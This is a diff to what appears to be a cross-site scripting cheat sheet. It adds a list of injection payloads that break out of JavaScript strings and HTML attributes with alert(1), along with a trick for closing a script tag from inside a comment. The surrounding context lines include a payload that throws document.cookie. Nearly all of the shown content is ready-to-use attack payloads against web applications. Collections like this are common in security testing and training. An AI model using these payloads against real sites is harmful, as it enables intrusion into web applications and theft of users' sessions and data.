@@ -117,6 +117,30 @@ location=/javascript:alert%2823%29/.source;
 ### 20 Chars MAX: 
 https://jlajara.gitlab.io/XSS_20_characters
 
+### Some random payloads
+```
+'-alert(1)-'
+"-alert(1)-"
+);alert(1)//
+';alert(1)//
+";alert(1)//
+"><img/src/onerror=alert(1)>//
+'><img/src/onerror=alert(1)>//
+>"@input="this.alert`1`
+>'@input="this.alert`1`
+&quot onerror='alert(1)'
+' onerror='alert(1)'
+" onerror='alert(1)'
+```
+
+## Escaping comments by closing tag 
+```
+<script>
+  // comment </script>XSS
+ /* comment </script>XSS
+</script>
+```
+
 ### Alert
 ```js
 var{a:onerror}={a:alert};throw%20document.cookie
